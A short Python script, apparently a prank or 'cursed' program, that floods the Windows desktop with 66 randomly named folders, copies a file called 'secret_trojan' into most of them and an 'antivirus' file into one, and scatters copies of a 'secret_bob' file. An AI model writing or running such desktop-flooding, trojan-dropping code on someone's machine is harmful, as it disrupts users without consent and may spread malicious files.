import random
from pathlib import Path
from win32com.shell import shell, shellcon # type: ignore
from shutil import copy

from cursed_constants import NAMES
from cursed_resourses import secret_bob,secret_trojan,antivirus

DESKTOP = shell.SHGetFolderPath (0, shellcon.CSIDL_DESKTOP, 0, 0)
desktop_path = Path(DESKTOP)

def create_unique_folder(path:Path) -> Path:
        new_path = path
        while new_path.exists():
            while True:
                try:
                    new_path = path.with_name(path.name+chr(random.randint(100,10000)) )
                    break
                except:
                    continue

        new_path.mkdir()
        return new_path

n_folders = 66
antivirus_i = random.randint(0,n_folders-1)
def create_files():
    for i in range(n_folders):
        
        if i == antivirus_i:
            path = create_unique_folder(desktop_path/f'{random.choice(NAMES)}')
            copy(antivirus,str(path))
        else:
            path = create_unique_folder(desktop_path/f'{random.choice(NAMES)}æ')
            copy(secret_trojan,str(path))
        copy(secret_bob,str(desktop_path/f'BOB{i*i*i*i}æ'))
